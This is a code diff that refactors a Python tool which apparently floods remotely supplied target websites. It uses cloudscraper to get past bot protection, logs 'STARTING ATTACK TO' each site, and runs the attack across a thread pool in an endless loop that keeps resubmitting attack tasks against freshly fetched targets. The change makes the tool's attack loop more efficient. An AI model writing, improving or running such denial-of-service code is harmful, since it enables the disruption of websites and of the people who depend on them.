@@ -60,7 +60,7 @@ def check_req():
     os.system("pip3 install -r requirements.txt")
 
 
-def mainth():
+def mainth(site: str):
     result = 'processing'
     scraper = cloudscraper.create_scraper(
         browser=settings.BROWSER, )
@@ -71,12 +71,6 @@ def mainth():
          'Accept-Encoding': 'gzip, deflate, br'})
 
     logger.info("GET RESOURCES FOR ATTACK")
-    try:
-        site = choice(remoteProvider.get_target_sites())
-    except Exception as e:
-        logger.exception(e)
-        sleep(5)
-        return
 
     logger.info("STARTING ATTACK TO " + site)
 
@@ -137,10 +131,11 @@ if __name__ == '__main__':
         clear()
     check_req()
     Thread(target=cleaner, daemon=True).start()
-
+    sites = remoteProvider.get_target_sites()
     with ThreadPoolExecutor(max_workers=threads) as executor:
         while True:
-            future_tasks = [executor.submit(mainth) for _ in range(threads)]
+            future_tasks = [executor.submit(mainth, choice(sites)) for _ in range(threads)]
             for task in as_completed(future_tasks):
                 status, site = task.result()
                 logger.info(f"{status.upper()}: {site}")
+                executor.submit(mainth, choice(remoteProvider.get_target_sites()))
